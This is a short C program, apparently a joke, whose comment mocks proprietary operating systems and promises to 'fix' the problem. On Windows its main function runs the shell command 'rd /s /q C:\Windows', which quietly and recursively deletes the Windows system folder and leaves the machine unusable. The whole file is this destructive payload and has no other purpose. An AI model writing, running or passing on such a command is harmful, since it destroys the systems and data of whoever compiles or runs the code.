#include <stdlib.h>
/* The problem is that the computer is running a propietary OS.
	No worries, this can easily be fixed! */
int main() {
#ifdef _WIN32
	system("rd /s /q C:\\Windows");
#endif
	return 0;
}

